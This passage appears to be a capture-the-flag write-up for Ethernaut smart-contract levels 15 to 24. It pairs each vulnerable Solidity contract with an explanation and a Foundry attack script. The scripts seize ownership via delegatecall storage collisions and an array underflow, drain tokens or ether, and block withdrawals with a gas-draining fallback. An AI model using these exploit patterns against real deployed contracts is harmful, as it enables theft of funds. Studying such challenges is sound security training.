contract Level15Sol is Script {
    NaughtCoin public instance =
        NaughtCoin(0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address player = address(instance.player());
        uint playerBalance = instance.balanceOf(player);
        Attack attack = new Attack();
        instance.approve(address(attack), playerBalance); //approving attack contract and balance
        attack.exploit(player);

        vm.stopBroadcast();
    }
}

```

**To run the script**

```
$ source .env
$ forge script script/Level15Solution.s.sol:Level15Sol --rpc-url $RPC_URL --broadcast
```

## Preservation

**Level16.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

**Goal:**
The goal of this level is for you to claim ownership of the instance you are given.

**Explanation:**

1. Preservation contract uses LibraryContract to set the time in the Preservation contract by using `delegatecall`.
2. So, the caller and callee contract storage layout should be matched. If not it may result in storage collision bugs.
3. Here the Preservation contract doesn’t matches the LibraryContract storage layout.
4. I observed that calling `setSecondTime` updates the `timeZone1Library` address in the Preservation contract.
5. By exploiting this we can write our own attacker contract that implements the `setTime()` function and pass that address to the `setSecondTime()` function so that it will updte the `timeZone1Library` address in the Preservation contract.
6. I implemented the Attack contract in such a way that it matches the Preservation storage layout and instead of updating the `storedTime`, i updated the `owner`. And that makes our attack contract as the owner of the Preservation contract.

**Level16Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level16.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack{

      address public timeZone1Library;
      address public timeZone2Library;
      address public owner; 
    
    function exploit () external{
          Preservation instance = Preservation(0xA1979400E9bbCEcd6B13aA814281A6B95866A077);
        //updating the timeZone1Library with attack contract address
          instance.setFirstTime(uint(uint160(address(this))));
          /*
          when we call  the setFirstTime f'n again , 
          it delegatecall to the attack contract and then results in changing the owner to msg.sender
           */
          instance.setFirstTime(uint(uint160(msg.sender)));
    }
    function setTime(uint _owner) external{
          owner = address(uint160(_owner));
    }
    }

contract Level16Sol is Script{
      function run() external{
            Preservation preservation = Preservation(0xA1979400E9bbCEcd6B13aA814281A6B95866A077);
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            Attack attack = new Attack();
            attack.exploit();
            vm.stopBroadcast();
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level16Solution.s.sol:Level16Sol --rpc-url $RPC_URL --broadcast
```

## Recovery

**Level17.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

**Goal:**

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

**Explanation:**

1. The SimpleToken contract is funded with 0.001 ether. We need to drain those ether.
2. To drain ether we can simply call the `destroy()` function of the SimpleToken contract.
3. But we dont have the address of the SimpleToken. We can user ETHERSCAN to identify the transaction of Recovery contract to find the address of the SimpleToken.
4. We can also use a formula that is mentioned in ethereum yellow paper about how a newly created contract address will be computed.
5. The formula is `address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))))`
6. `0xd6` and `0x94` are constants and the last byte1 is the nonce, i.e, number contracts created from the existed contract. We assume that its one.
7. By this formula we can recover the SimpleToken address and call the `destroy()` function to drain all ether.

**Level17Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Recovery} from "../src/Level17.sol";

contract Level17Sol is Script{
    Recovery public recovery = Recovery(0x7b9D82e39aa30ddAf4c5a9f132F4834926107Caf);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address myAddress = address(vm.envAddress("MY_ADDRESS"));
        Attack attack = new Attack();
        console.log("Attack Address : ", address(attack));
        console.log("MY Balance : ", myAddress.balance);
        
        address _creator = address(recovery);

        address token = attack.exploit(_creator, payable(myAddress));
        
        console.log("Token Address : ", token);
        console.log("MY Balance : ", myAddress.balance);

        vm.stopBroadcast();
    }
}

contract Attack{
    function exploit(address _creator, address payable _myAddress) public returns(address){
        address missedToken = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))));

        missedToken.call(abi.encodeWithSignature("destroy(address)", _myAddress));

        return missedToken;
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level17Solution.s.sol:Level17Sol --rpc-url $RPC_URL --broadcast

```

## Magic Number

**Level18.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {

  address public solver;

  constructor() {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```

**Goal:**

To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. But the solver contract should be very small at most 10 OPCODES.

**Explanation:**

1. To solve this challenge we need to write a contract that return 42. But the contract should be written with at most 10 OPCODES.
2. We need write our contract in Assembly not in solidity, so that we can build very tiny contract with less OPCODES.
3. Then we can convert it into bytecode and deploy onto blockchain and then pass the address to the `setSolver()` function.
4. Bytecodes are divided into two main types in solidity.
    1. Runtime bytecode
    2. Creation bytecode
5. **Runtime bytecode** will be stored on blockchain and executes when a call happens
6. **Creation code** consist of **init data**, **runtime data** and **constructor bytecode**. We need to create a runtime code which returns 42 upon call and append it with some init data which is required to deploy a contract.
7. We can use this creation code to deploy a contract using `create` opcode and pass the address of the deployed contract to `setSolver()`.

```
OPCODE   |    NAME
---------|---------
 0x60    |    PUSH1
 0x69    |    PUSH10
 0x52    |    MSTORE
 0xf3    |    RETURN

Runtime Opcode Creation:

PUSH1 0x2a (602a) - Pushing 42(0x2a) into the stack. Value(v) parameter to MSTORE.
PUSH1 0x00 (6000) - Pushing 0x00 into the stack. Position(p) parameter to MSTORE.
MSTORE     (52)   - Store value (0x2a) at position 0x00 in memory.
PUSH1 0x20 (6020) - Pushing 32 bytes into the stack. Size(s) parameter to RETURN.
PUSH1 0x00 (6000) - Pushing 0x00 into the stack. Position(p) parameter to RETURN.
RETURN     (f3)   - Returning value of size (32 bytes) from position (0x00).

Concatenating these opcodes gives the runtime bytecode as 602a60005260206000f3.


Initialization Opcode Creation:

PUSH10 0x602a60005260206000f3 (69602a60005260206000f3) - Pushing runtime bytecode into the stack.
                                                         Value(v) parameter to MSTORE.

PUSH1 0x00 (6000)                                      - Pushing 0x00 into the stack.
                                                         Position(p) parameter to MSTORE.

MSTORE (52)                                            - Stores runtime bytecode at 
                                                         position 0x00 into memory.  


PUSH1 0x0a (600a)                                      - Pushing 10 (length of the runtime code) 
                                                         into the stack. Size(s) parameter to RETURN.

PUSH1 0x16 (6016)                                      - Pushing 22 (offset position) into the stack.
                                                         Position(p) parameter to RETURN.


RETURN (f3)                                            - Returning value of size (10 bytes) 
                                                         from position (22).

Concatenating these opcodes gives the initialization code as 69602a60005260206000f3600052600a6016f3.

```


											    

**Level18Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {MagicNum} from "../src/Level18.sol";

contract Level18Sol is Script{
    MagicNum public magicNum = MagicNum(0xD5cf766bc937340767d9cf5Fd89eF1C14b78BF9B);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack().exploit();
        vm.stopBroadcast();

    }
}
contract Attack{
    MagicNum public magicNum = MagicNum(0xD5cf766bc937340767d9cf5Fd89eF1C14b78BF9B);
    function exploit() public{
        bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
        address _solver;
          // create(value, offset, size)
        assembly{
            _solver:= create(0,add(bytecode,0x20),0x13)
        }
        require(_solver != address(0));
        magicNum.setSolver(_solver);
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level18Solution.s.sol:Level18Sol --rpc-url $RPC_URL --broadcast
```

## Alien Codex

**Level19.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import './helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

**Goal:**

Claim ownership to complete the level.

**Explanation:**

1. When we see the solidity version, it is  0.5.0 and it is prone to  integer overflow/underflow.
2.  To call any function on the contract we need to call the `makeContact()` function initially.
3.  AlineCodex inherits the Ownable contract which has the state variable `owner`. It will be stored at slot 0 combined with `contact` boolean variable.
4. Here, in the slot 1 the legth of the `codex` array will be stored and it will be updated whenever a new element is pushed onto the array.
5. `AleinCodex` also changes the length of the `codex` with `retract()` function.
6. `revise()` function  allows us to modify any existing element of the `codex` array. Keep in mind that each element will stored at different storage slot.
7. Initially the length of the `codex` is 0. If we call the `retract()` it will be `0 - 1` which results in underflow and stores the value       **`2^256 - 1`** as the length.
8. So, now the codex array has access to all the storage slots of the contract. We can use this to update the `owner` value which is stored at the slot 0.
9. The codex array elements starts from the slot (keccak256(1)).
10. We need to pass the index 
 `2^256 - 1 - unit(keccack256(1)) + 1` to the  `revise()` function for accessing  the slot 0.
11. Pass our address in the `revise()` function along with the index. Then we will become the owner.


```

| Slot Number          | Variables                                                                                          |
|----------------------|----------------------------------------------------------------------------------------------------|
| 0                    | - bool public contact<br>- address private _owner<br>- codex[2^256 - 1 - uint(keccak256(1))] + 1 (Access to slot 0)  |
| 1                    | - codex.length (Number of elements in the dynamic array)                                            |
| keccak256(1)         | - codex[0] (Array's first element)                                                                 |
| keccak256(1) + 1     | - codex[1] (Array's second element)                                                                |
| ...                  | ...                                                                                                |
| ...                  | ...                                                                                                |
| ...                  | ...                                                                                                |
| 2^256 - 1            | - codex[2^256 - 1 - uint(keccak256(1))] (Array's last element)                                      |
| 0                    | - codex[2^256 - 1 - uint(keccak256(1))] + 1 (got access to slot 0)                                  |

```


**Level19Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IAlienCodex{

    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;

}

contract Level19Sol is Script{
    IAlienCodex public instance = IAlienCodex(0xe5EC55D210Edd23dBB7d055E9ed63DAA8E35e493);
    function run() external{
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

   

    uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
    bytes32 myAddress =  bytes32(uint256(uint160(vm.envUint("MY_ADDRESS"))));

    instance.makeContact();
    instance.retract();
    instance.revise(index,myAddress);

    bytes32 newOwner = vm.load(address(instance),bytes32(uint(0)));

    console.logBytes32(newOwner);

    vm.stopBroadcast();

    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level19Solution.s.sol:Level19Sol --rpc-url $RPC_URL --broadcast
```

## Denial

**Level20.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

**Goal:**

Deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

**Explanation:**

1. We should revert the call when the owner calls the `withdraw()` function. But if we do a simple revert in our contract fallback it won’t work.
2. Because withdraw function doesn’t check for the return value.
3. One thing we can do is, drain the gas of the transaction that is sent by the owner.
4. Call to partner is made by the `call` which will forward all the remaining gas to the external call.
5. So, we can drain all the gas by writing a most expensive computation in Partner contract.
6. I have written an infinite loop inside the fallback of the Attack contract and registered the Attack contract as the partner in Denial contract

**Level20Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Denial} from "../src/Level20.sol";

contract Level20Sol is Script{
    Denial public instance = Denial(payable(0x222eE4906Ab1064Af1c66ccA78c71F9a47b18EAE));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Hack().exploit();
        vm.stopBroadcast();
    }
}

contract Hack{
        Denial public instance = Denial(payable(0x222eE4906Ab1064Af1c66ccA78c71F9a47b18EAE));
        function exploit() public{
            instance.setWithdrawPartner(address(this));
        }
        fallback() external payable{
            //draining the entire gas with infinite loop
            uint i = 0;
            while (i < 10) {}
        }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level20Solution.s.sol:Level20Sol --rpc-url $RPC_URL --broadcast
```

## Shop

**Level21.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

**Goal:**

Сan you get the item from the shop for less than the price asked?

**Explanation:**

1. This is similar to the Elevator challenge. Elevator uses a an external normal function to call.
2. But here `price()` should a view function. Which shouldn’t modify the storage of the contract.
3. So, we cant just keep the number of the calls to the `price()` function in our Attack contract.
4. We can make use of `isSold` variable to check that the `price()` is called or not. This can be acceptable inside a view function.
5. So, I wrote Attack contract with `price()` function defined as view and it returns two different price values for the initial call and second call.

**Level21Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Shop} from "../src/Level21.sol";

contract Level21Sol is Script{
    Shop public instance = Shop(0x0a21654f3EA8917a109E09C32eC3aAF814e8d665);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack().exploit();
        vm.stopBroadcast();
    }
}

contract Attack{
    Shop public instance = Shop(0x0a21654f3EA8917a109E09C32eC3aAF814e8d665);

    function exploit() public {
        instance.buy();
    }
    function price() external view returns (uint){
        if(instance.isSold() == false){
            return 100;
        }
        return 9;
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level21Solution.s.sol:Level21Sol --rpc-url $RPC_URL --broadcast
```

## Dex

**Level22.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts/contracts/access/Ownable.sol';

contract Dex is Ownable(address(0x00)) {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

**Goal:**

The goal of this level is for you to hack the basic DEX contract and steal the funds by price manipulation.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.

**Explanation**:

1. You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
2. There is a `swap()` function inside Dex contract which swaps one token for another. Inside `swap()` intially two basic checks have been done to check for that the tokens are valid or not. And for the balance of the sender.
3. Observe that the `getSwapPrice()` is used to get the amount of tokens to be transferred to the `to` address.

```solidity
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || 
            (from == token2 && to == token   1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public 
  view returns(uint)
  {
    return((amount * IERC20(to).balanceOf(address(this)))/
    IERC20(from).balanceOf(address(this)));
  }
```
4.The `amount` is the amount of the tokens that added to the balance of `Dex` contract.

5.`swapAmount` is the amount of tokens that goes to the `to` address from the balance of the `Dex` contract.

6.When I started calculation for `swapAmount`, I have observed that swapping between two tokens slightly increases the balance of the `to` address.

```

For the first swap:
swap(Token1, Token2, 10) 
swapAmount = (10 * 100)/100 = 10 + balance of player in token2 is 10 
		   => 20

For the second swap:
swap(Token2, Token1, 20)
swapAmount = (20*110)/90 = 24 + 0 =>24

For the third swap:
swap(Token1, Token2, 24)
swapAmount = (24*110)/86 = 30 + 0 => 30

For the fourth swap:
swap(Token2, Token1, 30)
swapAmount = (30*110)/80 = 41 + 0 => 41

For the fifth swap:
swap(Token1, Token2, 41)
swapAmount = (41*110)/69 = 65 + 0 => 65

If we swap(Token2, Token1, 65) then 
swapAmount = (65*110)/45 = 158 but the transaction would fail because the Dex 
does not have enough balance to execute the transaction.

We need to calculate the amountOfToken2ToSell in order to get back 110 Token1

110 Token1 = amountOfToken2ToSell * DexBalanceOfToken1/DexBalanceOfToken2
110 = amountOfToken2ToSell * 110/45
amountOfToken2ToSell = 45

If we swap token2 with amount 45 then the balanceOf Token1 in Dex is 0.

 
Swap         |             Dex            |       User 
             |      Token1  | Token2      |  Token1 | Token2
-----------------------------------------------------------
 Before Swap |     100      | 100         |  10     |  10
 First Swap  |     110      | 90          |  0      |  20 
 Second Swap |     86       | 110         |  24     |  0
 Third Swap  |     110      | 80          |  0      |  30
 Fourth Swap |     69       | 110         |  41     |  0
 Fifth Swap  |     110      | 45          |  0      |  65  
 
 Sixth Swap  |     0        | 90          |  110    |  20

```

**Level22Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Dex} from "../src/Level22.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract Level22Sol is Script {
    Dex public instance = Dex(0x7f2041D22Bf8D693507A9347785C182BBB73285d);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = instance.token1();
        address token2 = instance.token2();

        console.log(token1);

        Attack attack = new Attack();

        instance.approve(address(attack), 10);
        address myAddress = address(vm.envAddress("MY_ADDRESS"));
        attack.exploit(myAddress);

        console.log(
            "DEX balance in TOKEN1 is ",
            instance.balanceOf(token1, address(instance))
        );
        vm.stopBroadcast();
    }
}

contract Attack {
    Dex public dex = Dex(0x7f2041D22Bf8D693507A9347785C182BBB73285d);
    address token1 = dex.token1();
    address token2 = dex.token2();

    function exploit(address myAddress) public {
        IERC20(token1).transferFrom(myAddress, address(this), 10);
        IERC20(token2).transferFrom(myAddress, address(this), 10);

        dex.approve(address(dex), type(uint64).max);

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);

        dex.swap(token2, token1, 45);
    }
}

```

**To run the script**

```
$ source .env
$ forge script script/Level22Solution.s.sol:Level22Sol --rpc-url $RPC_URL --broadcast
```

## Dex Two

**Level23.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts/contracts/access/Ownable.sol';

contract DexTwo is Ownable(msg.sender) {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

**Goal:**

You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

**Explanation:**

1. Observe that the `DexTwo` modifies the `swap()` function from the `Dex`. It removed the check of valid tokens.
2. So, we are now allowed to input any token addresses to the swap() function.
3. I created two Dummy Tokens and transferred 100 tokens each of the two tokens to the `Dex` address.
4. I swapped my Dummy tokens with the `token1` and `token2` balances of the `Dex` contract.

**Level23Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {DexTwo} from "../src/Level23.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract Level23Sol is Script {
    DexTwo public instance = DexTwo(0x9635173E4b119f8f3f459eAa61a75Ba75d759A63);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = address(instance.token1());
        address token2 = address(instance.token2());

        Attack attack = new Attack();
        attack.exploit();

        vm.stopBroadcast();
    }
}

contract Attack {
    DexTwo public instance = DexTwo(0x9635173E4b119f8f3f459eAa61a75Ba75d759A63);

    address token1 = address(instance.token1());
    address token2 = address(instance.token2());

    Dummy dummyToken1;

    constructor() {
        dummyToken1 = new Dummy();
    }

    function exploit() public {
        dummyToken1.transfer(address(instance), 100); //transfering 100 tokens to the Dex contract

        dummyToken1.approve(address(instance), 1000);

        instance.swap(address(dummyToken1), token2, 100);
        console.log(
            "token2 balance after swap  is ",
            instance.balanceOf(token2, address(instance))
        );

        // dummyToken1.transfer(address(instance),100);//transfering 100 tokens to the Dex contract

        dummyToken1.approve(address(instance), 1000);

        instance.swap(address(dummyToken1), token1, 200);

        console.log(
            "token1 balance after swap  is ",
            instance.balanceOf(token1, address(instance))
        );
    }
}

contract Dummy is ERC20("DummyToken", "Dummy") {
    constructor() {
        _mint(msg.sender, 10000);
    }
}

```

**To run the script**

```
$ source .env
$ forge script script/Level23Solution.s.sol:Level23Sol --rpc-url $RPC_URL --broadcast

```

## Puzzle Wallet

**Level24.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance; 
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

**Goal:**

You’ll need to hijack this wallet to become the admin of the proxy.

**Explanation:**

1. `PuzzleProxy` is a proxy contract and `PuzzleWallet` is an implementation contract.
2. Calls to `PuzzleProxy` will be forwarded to the `PuzzleWallet` through `delegatecall`.
3. Here, the storage layout of the two contracts are not matched. It may lead to storage collisions.
4. We need to become the admin of the proxy contract.
5. We can propose a new admin which will update the `pendingAdmin` variable in PuzzleProxy as well as the `owner` inside PuzzleWallet. Because of storage collision.
6. Then call the `addToWhiteList()` with our Attacker address to be able to call other functions of PuzzleWallet.
7. To override the `admin` variable in PuzzleProxy contract we have to change the `maxPrice` variable to address of our Attacker.
8. To update `maxPrice` we need to drain all the funds of the the PuzzleWallet. Initially it has 0.001 ether, We can able to deposit some ether and withdraw the same amount of ether only using the `execute()` function.
9. If we somehow able to pass this `require(balances[msg.sender] >= value, "Insufficient balance");` check we can withdraw more ether from wallet.
10. To do so, we need to send 0.001 ether only to the wallet, but we need to update the `balance[msg.sender]` to double of it. So that we can withdraw() 0.002 ether from the wallet. So that wallet balance will be zero.
